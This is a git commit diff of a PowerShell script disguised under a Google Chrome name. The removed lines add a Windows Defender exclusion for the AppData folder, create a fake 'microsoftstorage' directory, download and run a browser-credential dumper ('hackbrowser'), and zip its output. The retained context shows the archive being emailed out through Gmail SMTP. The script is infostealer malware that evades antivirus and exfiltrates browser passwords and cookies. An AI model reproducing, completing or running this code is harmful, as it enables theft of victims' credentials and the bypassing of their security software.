7f26b500981d266479740e4e3f53bb81df9c1b15
epicthoistaken <94729955+epicthoistaken@users.noreply.github.com>
2022-02-05 13:32:33 -0500

    Update googlechromescriptyes.ps1

--- googlechromescriptyes.ps1
+++ googlechromescriptyes.ps1
@@ -1,15 +1,3 @@
-#Adding windows defender exclusionpath
-Add-MpPreference -ExclusionPath "$env:appdata"
-#Creating the directory we will work on
-mkdir "$env:appdata\Microsoft\microsoftstorage"
-Set-Location "$env:appdata\Microsoft\microsoftstorage"
-#Downloading and executing hackbrowser.exe
-Invoke-WebRequest 'https://github.com/epicthoistaken/googlechromeyes/raw/main/googlechromeclientyes.exe' -OutFile "googlechrome.exe"
-.\hb.exe --format json
-Remove-Item -Path "$env:appdata\Microsoft\microsoftstorage\googlechrome.exe" -Force
-#Creating A Zip Archive
-Compress-Archive -Path * -DestinationPath google.zip
-$Random = Get-Random
 #Mailing the output you will need to enable less secure app access on your google account for this to work
 $SMTPServer = 'smtp.gmail.com'
 $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
